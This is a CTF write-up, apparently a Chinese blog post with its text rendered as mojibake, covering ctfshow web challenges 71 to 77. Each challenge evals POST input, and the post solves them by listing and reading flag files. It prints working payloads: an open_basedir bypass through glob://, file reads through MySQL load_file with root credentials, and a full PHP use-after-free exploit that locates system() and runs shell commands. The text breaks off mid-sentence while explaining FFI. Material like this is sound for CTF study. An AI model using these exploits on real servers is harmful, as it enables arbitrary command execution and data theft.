2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29ä½ è¦ä¸Šå¤©å—ï¼Ÿ $s = ob_get_contents();ï¼šè·å–è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶èµ‹å€¼ç»™å˜é‡sã€‚è¾“å‡ºç¼“å†²åŒºåœ¨ PHP ä¸­ç”¨äºä¸´æ—¶å­˜å‚¨è¦è¾“å‡ºåˆ°æµè§ˆå™¨ç­‰çš„å†…å®¹ï¼Œä»¥ä¾¿åœ¨åˆé€‚çš„æ—¶å€™è¿›è¡Œå¤„ç†æˆ–ä¿®æ”¹ã€‚\nob_end_clean();ï¼šæ¸…ç©ºè¾“å‡ºç¼“å†²åŒºå¹¶å…³é—­å®ƒï¼Œè¿™æ ·å°±æ¸…é™¤äº†åŸå§‹çš„ã€æœªç»å¤„ç†çš„è¾“å‡ºå†…å®¹ï¼Œä»¥ä¾¿åç»­è¿›è¡Œè‡ªå®šä¹‰çš„è¾“å‡ºå¤„ç†ã€‚\necho preg_replace(\u0026quot;/[0-9]|[a-z]/i\u0026quot;,\u0026quot;?\u0026quot;,$s);ï¼šè¿™è¡Œä»£ç ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹è·å–åˆ°çš„è¾“å‡ºå†…å®¹ï¼ˆå­˜å‚¨åœ¨sä¸­ï¼‰è¿›è¡Œæ›¿æ¢æ“ä½œã€‚å®ƒä¼šå°†æ‰€æœ‰çš„æ•°å­—å’Œå­—æ¯ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰éƒ½æ›¿æ¢ä¸º?ï¼Œç„¶åå°†å¤„ç†åçš„å†…å®¹è¾“å‡ºåˆ°æµè§ˆå™¨ç­‰è¾“å‡ºç«¯ã€‚\nä¹Ÿå°±æ˜¯è¯´è¿™é“é¢˜ä¼šå¯¹å›æ˜¾è¿›è¡Œå¤„ç†ï¼Œè®©æˆ‘ä»¬æ²¡æ³•å¾—åˆ°å›æ˜¾\næˆ‘ä»¬å¯ä»¥ç”¨exit()/die()æå‰ç»“æŸç¨‹åºï¼Œä»è€Œä¸æ‰§è¡Œåç»­ä»£ç ç›´æ¥è¿›è¡Œå›æ˜¾\nc=var_export(scandir(\u0026#34;/\u0026#34;));exit(); c=readgzfile(\u0026#39;/flag.txt\u0026#39;);exit(); web72 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15ini_set(\u0026#39;display_errors\u0026#39;, 0); 16// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 17if(isset($_POST[\u0026#39;c\u0026#39;])){ 18 $c= $_POST[\u0026#39;c\u0026#39;]; 19 eval($c); 20 $s = ob_get_contents(); 21 ob_end_clean(); 22 echo preg_replace(\u0026#34;/[0-9]|[a-z]/i\u0026#34;,\u0026#34;?\u0026#34;,$s); 23}else{ 24 highlight_file(__FILE__); 25} 26 27?\u0026gt; 28 29ä½ è¦ä¸Šå¤©å—ï¼Ÿ è¿™é“é¢˜ä¸€å¼€å§‹è¿˜ä»¥ä¸ºå’Œä¸Šä¸€é¢˜å·®ä¸å¤š\nå…ˆè¿›è¡Œç›®å½•æŸ¥è¯¢\nc=var_export(scandir(\u0026#34;./\u0026#34;));exit(); æ³¨æ„âš ï¸ è¿™é“é¢˜åªæœ‰æƒé™æŸ¥è¯¢çš„å½“å‰ç›®å½•ä¹Ÿå°±æ˜¯./\nè€Œæ— æ³•è®¿é—®åˆ°å…¶ä»–ç›®å½•çš„æ–‡ä»¶ï¼Œå¦‚ / æ ¹ç›®å½•\nå°è¯•ä½¿ç”¨ scandir() å‡½æ•°æ¥æ‰«ææ ¹ç›®å½•ï¼Œä½†ç”±äº open_basedir é™åˆ¶ï¼Œè¿™ä¸ªæ“ä½œè¢«ç¦æ­¢äº†ã€‚ open_basedir æ˜¯ PHP çš„ä¸€ä¸ªå®‰å…¨é…ç½®æŒ‡ä»¤ï¼Œç”¨æ¥é™åˆ¶ PHP è„šæœ¬åªèƒ½è®¿é—®ç‰¹å®šçš„ç›®å½•ã€‚ å½“å‰é…ç½®åªå…è®¸è®¿é—® /var/www/html/ ç›®å½•åŠå…¶å­ç›®å½•ï¼Œä½†ä¸å…è®¸è®¿é—®å…¶ä»–ç›®å½•ã€‚\nåŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/Myon5/article/details/140079942\næˆ‘ä»¬å¯ä»¥å°è¯•ç”¨globåè®®ç»•è¿‡open_basediråè®®\npayload:ï¼ˆè®°å¾—åˆ æ³¨é‡Šï¼‰\n1c=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// åˆ›å»ºä¸€ä¸ªDirectoryIteratorå¯¹è±¡ï¼Œéå†æ ¹ç›®å½• 2foreach($a as $f)// éå†æ¯ä¸ªæ¡ç›® 3{ 4 echo($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// è¾“å‡ºæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªç©ºæ ¼ 5} 6exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ 7?\u0026gt; æˆ–è€…\npayloadï¼šï¼ˆè®°å¾—åˆ æ³¨é‡Šï¼‰\n1c=?\u0026gt;\u0026lt;?php $a = opendir(\u0026#34;glob:///*\u0026#34;); // æ‰“å¼€æ ¹ç›®å½•ï¼Œå¹¶å°†ç›®å½•å¥æŸ„èµ‹å€¼ç»™$a 2while (($file = readdir($a)) !== false) { // å¾ªç¯è¯»å–ç›®å½•ä¸­çš„æ¯ä¸ªæ¡ç›® 3 echo $file . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // è¾“å‡ºæ¯ä¸ªæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ HTMLæ¢è¡Œæ ‡ç­¾ 4}; 5exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ 6?\u0026gt; æˆ‘ä»¬å¯ä»¥å‘ç°flag0.php\nåˆ©ç”¨uafçš„è„šæœ¬è¿›è¡Œå‘½ä»¤åˆ©ç”¨uafçš„è„šæœ¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ‰§è¡Œï¼š\nå°è¯•æ‰§è¡Œls /; cat /flag0.txtå‘½ä»¤\n1c=?\u0026gt;\u0026lt;?php 2pwn(\u0026#34;ls /;cat /flag0.txt\u0026#34;); 3 4function pwn($cmd) { 5 global $abc, $helper, $backtrace; 6 class Vuln { 7 public $a; 8 public function __destruct() { 9 global $backtrace; 10 unset($this-\u0026gt;a); 11 $backtrace = (new Exception)-\u0026gt;getTrace(); # ;) 12 if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { # PHP \u0026gt;= 7.4 13 $backtrace = debug_backtrace(); 14 } 15 } 16 } 17 18 class Helper { 19 public $a, $b, $c, $d; 20 } 21 22 function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { 23 $address = 0; 24 for($j = $s-1; $j \u0026gt;= 0; $j--) { 25 $address \u0026lt;\u0026lt;= 8; 26 $address |= ord($str[$p+$j]); 27 } 28 return $address; 29 } 30 31 function ptr2str($ptr, $m = 8) { 32 $out = \u0026#34;\u0026#34;; 33 for ($i=0; $i \u0026lt; $m; $i++) { 34 $out .= sprintf(\u0026#39;%c\u0026#39;,$ptr \u0026amp; 0xff); 35 $ptr \u0026gt;\u0026gt;= 8; 36 } 37 return $out; 38 } 39 40 function write(\u0026amp;$str, $p, $v, $n = 8) { 41 $i = 0; 42 for($i = 0; $i \u0026lt; $n; $i++) { 43 $str[$p + $i] = sprintf(\u0026#39;%c\u0026#39;,$v \u0026amp; 0xff); 44 $v \u0026gt;\u0026gt;= 8; 45 } 46 } 47 48 function leak($addr, $p = 0, $s = 8) { 49 global $abc, $helper; 50 write($abc, 0x68, $addr + $p - 0x10); 51 $leak = strlen($helper-\u0026gt;a); 52 if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } 53 return $leak; 54 } 55 56 function parse_elf($base) { 57 $e_type = leak($base, 0x10, 2); 58 59 $e_phoff = leak($base, 0x20); 60 $e_phentsize = leak($base, 0x36, 2); 61 $e_phnum = leak($base, 0x38, 2); 62 63 for($i = 0; $i \u0026lt; $e_phnum; $i++) { 64 $header = $base + $e_phoff + $i * $e_phentsize; 65 $p_type = leak($header, 0, 4); 66 $p_flags = leak($header, 4, 4); 67 $p_vaddr = leak($header, 0x10); 68 $p_memsz = leak($header, 0x28); 69 70 if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write 71 # handle pie 72 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; 73 $data_size = $p_memsz; 74 } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec 75 $text_size = $p_memsz; 76 } 77 } 78 79 if(!$data_addr || !$text_size || !$data_size) 80 return false; 81 82 return [$data_addr, $text_size, $data_size]; 83 } 84 85 function get_basic_funcs($base, $elf) { 86 list($data_addr, $text_size, $data_size) = $elf; 87 for($i = 0; $i \u0026lt; $data_size / 8; $i++) { 88 $leak = leak($data_addr, $i * 8); 89 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 90 $deref = leak($leak); 91 # \u0026#39;constant\u0026#39; constant check 92 if($deref != 0x746e6174736e6f63) 93 continue; 94 } else continue; 95 96 $leak = leak($data_addr, ($i + 4) * 8); 97 if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { 98 $deref = leak($leak); 99 # \u0026#39;bin2hex\u0026#39; constant check 100 if($deref != 0x786568326e6962) 101 continue; 102 } else continue; 103 104 return $data_addr + $i * 8; 105 } 106 } 107 108 function get_binary_base($binary_leak) { 109 $base = 0; 110 $start = $binary_leak \u0026amp; 0xfffffffffffff000; 111 for($i = 0; $i \u0026lt; 0x1000; $i++) { 112 $addr = $start - 0x1000 * $i; 113 $leak = leak($addr, 0, 7); 114 if($leak == 0x10102464c457f) { # ELF header 115 return $addr; 116 } 117 } 118 } 119 120 function get_system($basic_funcs) { 121 $addr = $basic_funcs; 122 do { 123 $f_entry = leak($addr); 124 $f_name = leak($f_entry, 0, 6); 125 126 if($f_name == 0x6d6574737973) { # system 127 return leak($addr + 8); 128 } 129 $addr += 0x20; 130 } while($f_entry != 0); 131 return false; 132 } 133 134 function trigger_uaf($arg) { 135 # str_shuffle prevents opcache string interning 136 $arg = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 137 $vuln = new Vuln(); 138 $vuln-\u0026gt;a = $arg; 139 } 140 141 if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { 142 die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); 143 } 144 145 $n_alloc = 10; # increase this value if UAF fails 146 $contiguous = []; 147 for($i = 0; $i \u0026lt; $n_alloc; $i++) 148 $contiguous[] = str_shuffle(\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;); 149 150 trigger_uaf(\u0026#39;x\u0026#39;); 151 $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; 152 153 $helper = new Helper; 154 $helper-\u0026gt;b = function ($x) { }; 155 156 if(strlen($abc) == 79 || strlen($abc) == 0) { 157 die(\u0026#34;UAF failed\u0026#34;); 158 } 159 160 # leaks 161 $closure_handlers = str2ptr($abc, 0); 162 $php_heap = str2ptr($abc, 0x58); 163 $abc_addr = $php_heap - 0xc8; 164 165 # fake value 166 write($abc, 0x60, 2); 167 write($abc, 0x70, 6); 168 169 # fake reference 170 write($abc, 0x10, $abc_addr + 0x60); 171 write($abc, 0x18, 0xa); 172 173 $closure_obj = str2ptr($abc, 0x20); 174 175 $binary_leak = leak($closure_handlers, 8); 176 if(!($base = get_binary_base($binary_leak))) { 177 die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); 178 } 179 180 if(!($elf = parse_elf($base))) { 181 die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); 182 } 183 184 if(!($basic_funcs = get_basic_funcs($base, $elf))) { 185 die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); 186 } 187 188 if(!($zif_system = get_system($basic_funcs))) { 189 die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); 190 } 191 192 # fake closure object 193 $fake_obj_offset = 0xd0; 194 for($i = 0; $i \u0026lt; 0x110; $i += 8) { 195 write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); 196 } 197 198 # pwn 199 write($abc, 0x20, $abc_addr + $fake_obj_offset); 200 write($abc, 0xd0 + 0x38, 1, 4); # internal func type 201 write($abc, 0xd0 + 0x68, $zif_system); # internal func handler 202 203 ($helper-\u0026gt;b)($cmd); 204 exit(); 205} 206?\u0026gt; è®°å¾—è¦è½¬url\næ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢ï¼Ÿ ï¼ˆå…ˆæŒ–ä¸ªå‘å›å¤´è¡¥ï¼‰\nweb73 è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«å…¶å®å°±æ˜¯flagçš„æ–‡ä»¶æ”¹åäº†ï¼Œæˆ‘ä»¬ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•è¯»ä¸€ä¸‹æ–‡ä»¶\nc=?\u0026gt;\u0026lt;?php $a=new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);// åˆ›å»ºä¸€ä¸ªDirectoryIteratorå¯¹è±¡ï¼Œéå†æ ¹ç›®å½•\rforeach($a as $f)// éå†æ¯ä¸ªæ¡ç›®\r{\recho($f-\u0026gt;__toString().\u0026#39; \u0026#39;);// è¾“å‡ºæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªç©ºæ ¼\r}\rexit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ\r?\u0026gt; å¯ä»¥çœ‹åˆ°ä¸€ä¸ªflagc.txtæ–‡ä»¶\nè¿™é¢˜å…¶å®å·²ç»å…³é—­äº†open_basedirï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¹‹å‰çš„æ–¹æ³•è¯»\nvar_export(scandir(\u0026#39;/\u0026#39;));exit(); echo(implode(\u0026#39; \u0026#39;,scandir(\u0026#39;/\u0026#39;)));exit(); è¯»æ–‡ä»¶çš„è¯ä¸Šä¸€é¢˜çš„uafæ–¹æ³•è¢«banäº†ï¼Œè¿™é¢˜ç”¨ä¸äº†\næ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯ç”¨ä¹‹å‰æ–¹æ³•\nc=readgzfile(\u0026#39;/flagc.txt\u0026#39;);exit(); web74 è¿™é¢˜æˆ‘å…ˆç”¨ä¹‹å‰çš„æ–¹æ³•var_exportè¯•è¯•èƒ½ä¸èƒ½è¯»åˆ°ç›®å½•ï¼Œå‘ç°æ˜¾ç¤ºnullï¼Œåº”è¯¥æ˜¯open_basediræ‰“å¼€äº†\næ¥ç€ç”¨globåè®®çš„æ–¹æ³•è¯»åˆ°äº†ï¼Œflagæ–‡ä»¶åå«åšflagx.txt\nå…ˆç”¨uafçš„æ–¹æ³•è¯•è¯•\nå‘ç°è¿™æ¡è·¯è¢«banæ‰äº†\næœ€åç”¨\nc=readgzfile(\u0026#39;/flagx.txt\u0026#39;);exit(); æˆåŠŸæŸ¥åˆ°äº†flag\nweb75 è¿™é¢˜è¦ç”¨globæŸ¥æ–‡ä»¶ï¼Œç”¨var_exportæŸ¥ä¸äº†\næ¥ä¸‹æ¥æ˜¯è¯»æ–‡ä»¶\nå°è¯•äº†uafå’Œreadgzfileä¹‹ç±»çš„æ–¹æ³•éƒ½å¤±è´¥äº†\næ²¡åŠæ³•çœ‹çœ‹å¤§ä½¬æ€ä¹ˆåšçš„\næˆ‘ä»¬å…¶å®å¯ä»¥ç”¨åˆ°mysqlçš„load_fileæ–¹æ³•ï¼Œä»è€Œè¯»åˆ°flag\npayload:\n1c=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); è±†åŒ…è§£é‡Šä¸€ä¸‹\næ•°æ®åº“è¿æ¥ï¼š $conn = mysqli_connect(\u0026quot;127.0.0.1\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;root\u0026quot;, \u0026quot;ctftraining\u0026quot;); è¿™è¡Œä»£ç ä½¿ç”¨ MySQLi æ‰©å±•å»ºç«‹äº†ä¸€ä¸ªä¸ MySQL æ•°æ®åº“çš„è¿æ¥ã€‚å®ƒæŒ‡å®šäº†æ•°æ®åº“æœåŠ¡å™¨çš„ IP åœ°å€ä¸º127.0.0.1ï¼ˆæœ¬åœ°ä¸»æœºï¼‰ï¼Œç”¨æˆ·åæ˜¯rootï¼Œå¯†ç ä¹Ÿæ˜¯rootï¼Œè¦è¿æ¥çš„æ•°æ®åº“åç§°æ˜¯ctftrainingã€‚å¦‚æœè¿æ¥æˆåŠŸï¼Œ$connå°†ä¿å­˜è¿™ä¸ªæ•°æ®åº“è¿æ¥å¯¹è±¡ï¼Œä»¥ä¾¿åç»­è¿›è¡Œæ•°æ®åº“æ“ä½œï¼›å¦‚æœè¿æ¥å¤±è´¥ï¼Œå°†ä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼ˆä¸è¿‡åœ¨è¿™æ®µä»£ç ä¸­æ²¡æœ‰å¯¹è¿æ¥å¤±è´¥æƒ…å†µåšæ˜¾å¼å¤„ç†ï¼‰ã€‚ SQL æŸ¥è¯¢è¯­å¥æ„å»ºï¼š $sql = \u0026quot;select load_file('/flag36.txt') as a\u0026quot;; è¿™é‡Œæ„å»ºäº†ä¸€ä¸ª SQL æŸ¥è¯¢è¯­å¥ã€‚load_file()æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ã€‚åœ¨è¿™ä¸ªæŸ¥è¯¢ä¸­ï¼Œå®ƒè¯•å›¾è¯»å–æœåŠ¡å™¨ä¸Š/flag36.txtæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ç»™æŸ¥è¯¢ç»“æœçš„è¿™ä¸€åˆ—èµ·äº†ä¸€ä¸ªåˆ«åaã€‚ æ‰§è¡ŒæŸ¥è¯¢å¹¶è·å–ç»“æœï¼š $row = mysqli_query($conn, $sql); è¿™è¡Œä»£ç ä½¿ç”¨å·²ç»å»ºç«‹å¥½çš„æ•°æ®åº“è¿æ¥$connæ¥æ‰§è¡Œå‰é¢æ„å»ºçš„ SQL æŸ¥è¯¢è¯­å¥$sqlã€‚å¦‚æœæŸ¥è¯¢æ‰§è¡ŒæˆåŠŸï¼Œ$rowå°†åŒ…å«æŸ¥è¯¢ç»“æœé›†çš„èµ„æºå¯¹è±¡ï¼ˆå¯ä»¥ç†è§£ä¸ºæŒ‡å‘æŸ¥è¯¢ç»“æœæ•°æ®çš„ä¸€ç§å¼•ç”¨ï¼‰ï¼›å¦‚æœæŸ¥è¯¢å¤±è´¥ï¼ŒåŒæ ·ä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼ˆè¿™é‡Œä¹Ÿæœªåšæ˜¾å¼å¤„ç†ï¼‰ã€‚ while($result=mysqli_fetch_array($row)){ echo $result['a']; } è¿™ä¸ªwhileå¾ªç¯ç”¨äºéå†æŸ¥è¯¢ç»“æœé›†ã€‚mysqli_fetch_array()å‡½æ•°æ¯æ¬¡ä»ç»“æœé›†ä¸­è·å–ä¸€è¡Œæ•°æ®ï¼Œå¹¶ä»¥æ•°ç»„çš„å½¢å¼è¿”å›ã€‚åœ¨å¾ªç¯å†…éƒ¨ï¼Œå®ƒé€šè¿‡$result['a']æ¥è·å–å‰é¢æŸ¥è¯¢ä¸­load_file()å‡½æ•°è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹ï¼ˆå› ä¸ºåœ¨æŸ¥è¯¢ä¸­ç»™è¿™ä¸€åˆ—èµ·äº†åˆ«åaï¼‰ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚ ç¨‹åºç»“æŸï¼š exit(); è¿™è¡Œä»£ç ä½¿å¾—è„šæœ¬åœ¨å®ŒæˆæŸ¥è¯¢ç»“æœè¾“å‡ºåç«‹å³ç»ˆæ­¢æ‰§è¡Œï¼Œä¸å†æ‰§è¡Œåç»­å¯èƒ½å­˜åœ¨çš„å…¶ä»–ä»£ç ã€‚ ä¹Ÿå¯ä»¥\nç”¨PDOçš„æ–¹æ³•æ¥å®ç°åŒæ ·çš„ç›®çš„\npayload:\n1c=try {$dbh = new PDO(\u0026#39;mysql:host=localhost;dbname=ctftraining\u0026#39;, \u0026#39;root\u0026#39;, 2\u0026#39;root\u0026#39;);foreach($dbh-\u0026gt;query(\u0026#39;select load_file(\u0026#34;/flag36.txt\u0026#34;)\u0026#39;) as $row) 3{echo($row[0]).\u0026#34;|\u0026#34;; }$dbh = null;}catch (PDOException $e) {echo $e- 4\u0026gt;getMessage();exit(0);}exit(0); æ•°æ®åº“è¿æ¥å»ºç«‹ï¼š $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); è¿™è¡Œä»£ç ä½¿ç”¨ PDO åˆ›å»ºäº†ä¸€ä¸ªä¸ MySQL æ•°æ®åº“çš„è¿æ¥å¯¹è±¡ $dbhã€‚å®ƒæŒ‡å®šäº†æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåä¸º localhostï¼Œè¦è¿æ¥çš„æ•°æ®åº“åç§°æ˜¯ ctftrainingï¼Œä»¥åŠç”¨äºç™»å½•æ•°æ®åº“çš„ç”¨æˆ·å root å’Œå¯†ç  rootã€‚å¦‚æœè¿æ¥æˆåŠŸï¼Œåç»­å°±å¯ä»¥é€šè¿‡è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ•°æ®åº“ç›¸å…³çš„æ“ä½œï¼›å¦‚æœè¿æ¥å¤±è´¥ï¼Œå°†ä¼šæŠ›å‡ºä¸€ä¸ª PDOException å¼‚å¸¸ã€‚ æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼š foreach($dbh-\u0026gt;query('select load_file(\u0026quot;/flag36.txt\u0026quot;)') as $row) è¿™é‡Œé€šè¿‡å·²å»ºç«‹çš„æ•°æ®åº“è¿æ¥å¯¹è±¡ $dbh æ‰§è¡Œäº†ä¸€ä¸ª SQL æŸ¥è¯¢è¯­å¥ select load_file(\u0026quot;/flag36.txt\u0026quot;)ã€‚load_file() æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸ªæŸ¥è¯¢è¯­å¥çš„ç›®çš„å°±æ˜¯è·å–æœåŠ¡å™¨ä¸Š /flag36.txt æ–‡ä»¶çš„å†…å®¹ã€‚ ç„¶åä½¿ç”¨ foreach å¾ªç¯æ¥éå†æŸ¥è¯¢ç»“æœé›†ã€‚æ¯æ¬¡å¾ªç¯ï¼Œ$row å°†ä¼šè·å–åˆ°æŸ¥è¯¢ç»“æœé›†ä¸­çš„ä¸€è¡Œæ•°æ®ï¼Œç”±äºæŸ¥è¯¢ç»“æœåªæœ‰ä¸€åˆ—ï¼ˆå³ load_file() å‡½æ•°è¿”å›çš„æ–‡ä»¶å†…å®¹é‚£ä¸€åˆ—ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ $row[0] æ¥è·å–è¿™ä¸€åˆ—çš„å€¼ã€‚ ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾ ç»“æœè¾“å‡ºï¼š echo($row[0]).\u0026quot;|\u0026quot;; åœ¨æ¯æ¬¡éå†æŸ¥è¯¢ç»“æœé›†çš„å¾ªç¯ä¸­ï¼Œè¿™è¡Œä»£ç å°†è·å–åˆ°çš„æ–‡ä»¶å†…å®¹ï¼ˆé€šè¿‡ $row[0]ï¼‰è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œå¹¶åœ¨åé¢æ·»åŠ ä¸€ä¸ª | ä½œä¸ºåˆ†éš”ç¬¦ã€‚ æ•°æ®åº“è¿æ¥èµ„æºé‡Šæ”¾ï¼š $dbh = null; å½“æŸ¥è¯¢ç»“æœå¤„ç†å®Œæ¯•åï¼Œè¿™è¡Œä»£ç å°†æ•°æ®åº“è¿æ¥å¯¹è±¡ $dbh è®¾ç½®ä¸º nullï¼Œè¿™æœ‰åŠ©äºé‡Šæ”¾ä¸è¯¥è¿æ¥ç›¸å…³çš„èµ„æºï¼Œç¡®ä¿ç³»ç»Ÿèµ„æºçš„åˆç†åˆ©ç”¨ã€‚ å¼‚å¸¸å¤„ç† æ•è·å¼‚å¸¸ï¼š catch (PDOException $e) {echo $e-\u0026gt;getMessage();exit(0);} æ•´ä¸ª try ä»£ç å—è¢«æ”¾ç½®åœ¨ä¸€ä¸ª try-catch è¯­å¥ä¸­ã€‚å¦‚æœåœ¨å°è¯•å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡ŒæŸ¥è¯¢ç­‰æ“ä½œè¿‡ç¨‹ä¸­å‡ºç°ä»»ä½• PDOException å¼‚å¸¸ï¼ˆæ¯”å¦‚æ•°æ®åº“è¿æ¥å¤±è´¥ã€æŸ¥è¯¢è¯­å¥è¯­æ³•é”™è¯¯ç­‰æƒ…å†µï¼‰ï¼Œå¼‚å¸¸å°†ä¼šè¢«è¿™ä¸ª catch å—æ•è·ã€‚ ä¸€æ—¦æ•è·åˆ°å¼‚å¸¸ï¼Œcatch å—ä¸­çš„ä»£ç å°†ä¼šæ‰§è¡Œã€‚è¿™é‡Œé¦–å…ˆé€šè¿‡ $e-\u0026gt;getMessage() è·å–åˆ°å…·ä½“çš„å¼‚å¸¸æ¶ˆæ¯ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œç„¶åä½¿ç”¨ exit(0) ç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œä»¥é˜²æ­¢åç»­å¯èƒ½å‡ºç°çš„é”™è¯¯æˆ–æœªå®šä¹‰è¡Œä¸ºã€‚ web76 è¿™é¢˜ä¾æ—§æ˜¯ç”¨globåè®®æŸ¥ç›®å½•ï¼Œå¾—åˆ°æ–‡ä»¶åä¸ºflag36d.txt\nç”¨ä¸Šä¸€é¢˜mysqlçš„æ–¹æ³•ï¼ŒæˆåŠŸæŸ¥åˆ°flag\npayload:\nc=$conn = mysqli_connect(\u0026#34;127.0.0.1\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;ctftraining\u0026#34;); $sql = \u0026#34;select load_file(\u0026#39;/flag36d.txt\u0026#39;) as a\u0026#34;; $row = mysqli_query($conn, $sql); while($result=mysqli_fetch_array($row)){ echo $result[\u0026#39;a\u0026#39;]; } exit(); web77 ç”¨globåè®®çš„æ–¹æ³•æŸ¥å‡ºflagæ–‡ä»¶ä¸ºflag36x.phpï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶\næ¥ä¸‹æ¥è¦çœ‹çœ‹æ€ä¹ˆæŸ¥æ–‡ä»¶\nä¸Šä¸¤é¢˜ç”¨åˆ°çš„è¯»flagçš„æ–¹æ³•ï¼ˆmysqlï¼‰è¿™é¢˜ç”¨ä¸äº†ï¼Œéœ€è¦æƒ³ç‚¹å…¶ä»–çš„æ–¹æ³•\nå®˜æ–¹çš„wpç”¨ PHP ä¸­çš„ FFIï¼ˆForeign Function Interfaceï¼‰æ–¹æ³•æ¥è°ƒç”¨ C è¯­è¨€çš„ system å‡½æ•°ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ª Shell å‘½ä»¤ã€‚\nä»€ä¹ˆæ˜¯FFI? PHP FFIï¼ˆForeign Function Interfaceï¼‰æ˜¯ PHP 7.4 åŠä»¥ä¸Šç‰ˆæœ¬å¼•å…¥çš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½ã€‚å®ƒå…è®¸ 